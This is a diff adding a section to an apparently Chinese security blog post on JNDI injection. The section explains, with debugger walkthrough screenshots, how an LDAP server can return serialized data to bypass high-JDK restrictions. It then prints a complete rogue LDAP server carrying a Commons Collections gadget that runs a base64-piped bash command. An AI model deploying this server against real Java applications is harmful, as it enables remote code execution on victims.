@@ -333,6 +333,169 @@ public class <span class="hljs-type">BypassCodebase</span> {
               
                 <h2 class="section-heading">利用LDAP返回序列化数据</h2>
                 
+                <p>&nbsp;&nbsp;&nbsp;LDAP Server除了使用JNDI Reference进行利用之外，还支持直接返回一个对象的序列化数据。
+                  通过构造恶意反序列化内容触发本地Gadget绕过高版本JDK的限制，所以需要本地存在Gadget才可以利用。</p>
+                
+                
+              <p>&nbsp;&nbsp;&nbsp;首先来到客户端的lookup打断点。</p>
+              
+              
+              <a data-fancybox="gallery" href="../img/2022-3-27/3-1.jpg">
+                <img class="img-fluid" src="../img/2022-3-27/3-1.jpg" alt="">
+              </a>
+              
+              <p>&nbsp;&nbsp;&nbsp;跟前面的差不多，进入lookup方法。</p>
+              
+              
+              <a data-fancybox="gallery" href="../img/2022-3-27/3-2.jpg">
+                <img class="img-fluid" src="../img/2022-3-27/3-2.jpg" alt="">
+              </a>
+              
+              <p>&nbsp;&nbsp;&nbsp;继续调用lookup方法。</p>
+              
+              
+              <a data-fancybox="gallery" href="../img/2022-3-27/3-3.jpg">
+                <img class="img-fluid" src="../img/2022-3-27/3-3.jpg" alt="">
+              </a>
+              
+              <p>&nbsp;&nbsp;&nbsp;再次调用lookup方法。</p>
+              
+              
+              <a data-fancybox="gallery" href="../img/2022-3-27/3-4.jpg">
+                <img class="img-fluid" src="../img/2022-3-27/3-4.jpg" alt="">
+              </a>
+              
+              <p>&nbsp;&nbsp;&nbsp;重点的地方开始来了，从这里调用了p_lookup方法。</p>
+              
+              <a data-fancybox="gallery" href="../img/2022-3-27/3-8.jpg">
+                <img class="img-fluid" src="../img/2022-3-27/3-8.jpg" alt="">
+              </a>
+              
+              <p>&nbsp;&nbsp;&nbsp;接着在switch条件中进入case 2调用c_lookup方法。</p>
+              
+              <a data-fancybox="gallery" href="../img/2022-3-27/3-5.jpg">
+                <img class="img-fluid" src="../img/2022-3-27/3-5.jpg" alt="">
+              </a>
+              
+              <p>&nbsp;&nbsp;&nbsp;在c_lookup方法中，可以看到这里通过doSearchOnce方法获取ldap的内容。
+              之后将获取到的序列化数据传入decodeObject方法中，需要注意的是这里需要先经过一个if判断Attribute，所以payload构造了e.addAttribute来进行绕过。</p>
+              
+              <a data-fancybox="gallery" href="../img/2022-3-27/3-6.jpg">
+                <img class="img-fluid" src="../img/2022-3-27/3-6.jpg" alt="">
+              </a>
+              
+              <p>&nbsp;&nbsp;&nbsp;进入到decodeObject方法中，这里在调用deserializeObject之前，又进行了一次Attribute判断，
+              所以payload才会构造两次e.addAttribute。之后便进入decodeObject方法中进行反序列化。</p>
+              
+              <a data-fancybox="gallery" href="../img/2022-3-27/3-7.jpg">
+                <img class="img-fluid" src="../img/2022-3-27/3-7.jpg" alt="">
+              </a>
+          
+              
+              
+              <h2 class="section-heading">LdapBypass</h2>
+              
+              <div>
+              	
+              	<pre class='hljs'><code><span class="hljs-preprocessor"><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span>
+<span class="hljs-preprocessor"><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span>
+<span class="hljs-preprocessor"><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span>
+<span class="hljs-preprocessor"><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span>
+<span class="hljs-preprocessor"><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span>
+<span class="hljs-preprocessor"><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.Entry;</span>
+<span class="hljs-preprocessor"><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span>
+<span class="hljs-preprocessor"><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span>
+<span class="hljs-preprocessor"><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span>
+<span class="hljs-preprocessor"><span class="hljs-keyword">import</span> com.unboundid.util.Base64;</span>
+
+<span class="hljs-preprocessor"><span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;</span>
+<span class="hljs-preprocessor"><span class="hljs-keyword">import</span> javax.net.SocketFactory;</span>
+<span class="hljs-preprocessor"><span class="hljs-keyword">import</span> javax.net.ssl.SSLSocketFactory;</span>
+<span class="hljs-preprocessor"><span class="hljs-keyword">import</span> java.net.InetAddress;</span>
+<span class="hljs-preprocessor"><span class="hljs-keyword">import</span> java.net.MalformedURLException;</span>
+<span class="hljs-preprocessor"><span class="hljs-keyword">import</span> java.net.URL;</span>
+<span class="hljs-preprocessor"><span class="hljs-keyword">import</span> java.text.ParseException;</span>
+
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LdapBypass</span> </span>{
+    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String LDAP_BASE = <span class="hljs-string">"dc=example,dc=com"</span>;
+
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> main(String[] args) {
+
+        String url = <span class="hljs-string">"http://127.0.0.1:8000/#EvilObject"</span>;
+        int port = <span class="hljs-number">1099</span>;
+
+        <span class="hljs-keyword">try</span> {
+            InMemoryDirectoryServerConfig config = <span class="hljs-keyword">new</span> InMemoryDirectoryServerConfig(LDAP_BASE);
+            config.setListenerConfigs(<span class="hljs-keyword">new</span> InMemoryListenerConfig(
+                    <span class="hljs-string">"listen"</span>,
+                    InetAddress.getByName(<span class="hljs-string">"0.0.0.0"</span>),
+                    port,
+                    ServerSocketFactory.getDefault(),
+                    SocketFactory.getDefault(),
+                    (SSLSocketFactory) SSLSocketFactory.getDefault()));
+
+            config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> OperationInterceptor(<span class="hljs-keyword">new</span> URL(url)));
+            InMemoryDirectoryServer ds = <span class="hljs-keyword">new</span> InMemoryDirectoryServer(config);
+            System.out.println(<span class="hljs-string">"Listening on 0.0.0.0:"</span> + port);
+            ds.startListening();
+
+        } <span class="hljs-keyword">catch</span> (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OperationInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">InMemoryOperationInterceptor</span> </span>{
+
+        <span class="hljs-keyword">private</span> URL codebase;
+
+        <span class="hljs-keyword">public</span> OperationInterceptor(URL cb) {
+            <span class="hljs-keyword">this</span>.codebase = cb;
+        }
+
+        <span class="hljs-comment">/**
+         * {@inheritDoc}
+         *
+         * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
+         */</span>
+
+        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> processSearchResult(InMemoryInterceptedSearchResult result) {
+            String base = result.getRequest().getBaseDN();
+            Entry e = <span class="hljs-keyword">new</span> Entry(base);
+            <span class="hljs-keyword">try</span> {
+                sendResult(result, base, e);
+            } <span class="hljs-keyword">catch</span> (Exception e1) {
+                e1.printStackTrace();
+            }
+
+        }
+
+        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws LDAPException, MalformedURLException {
+            URL turl = <span class="hljs-keyword">new</span> URL(<span class="hljs-keyword">this</span>.codebase, <span class="hljs-keyword">this</span>.codebase.getRef().replace(<span class="hljs-string">'.'</span>, <span class="hljs-string">'/'</span>).concat(<span class="hljs-string">".class"</span>));
+            System.out.println(<span class="hljs-string">"Send LDAP reference result for "</span> + base + <span class="hljs-string">" redirecting to "</span> + turl);
+            e.addAttribute(<span class="hljs-string">"javaClassName"</span>, <span class="hljs-string">"Exploit"</span>);
+            String cbstring = <span class="hljs-keyword">this</span>.codebase.toString();
+            int refPos = cbstring.indexOf(<span class="hljs-string">'#'</span>);
+            <span class="hljs-keyword">if</span> (refPos &gt; <span class="hljs-number">0</span>) {
+                cbstring = cbstring.substring(<span class="hljs-number">0</span>, refPos);
+            }
+
+            <span class="hljs-comment">// 返回序列化Gadget</span>
+            <span class="hljs-keyword">try</span> {
+                e.addAttribute(<span class="hljs-string">"javaSerializedData"</span>, Base64.decode(<span class="hljs-string">"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AF1iYXNoIC1jIHtlY2hvLGIzQmxiaUF2VTNsemRHVnRMMEZ3Y0d4cFkyRjBhVzl1Y3k5RFlXeGpkV3hoZEc5eUxtRndjQT09fXx7YmFzZTY0LC1kfXx7YmFzaCwtaX10AARleGVjdXEAfgAbAAAAAXEAfgAgc3EAfgAPc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAFzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAAAHh4eA=="</span>));
+            } <span class="hljs-keyword">catch</span> (ParseException exception) {
+                exception.printStackTrace();
+            }
+
+            result.sendSearchEntry(e);
+            result.setResult(<span class="hljs-keyword">new</span> LDAPResult(<span class="hljs-number">0</span>, ResultCode.SUCCESS));
+        }
+    }
+}</code></pre>
+              	
+              </div>
+              
+              
                 
                 
               
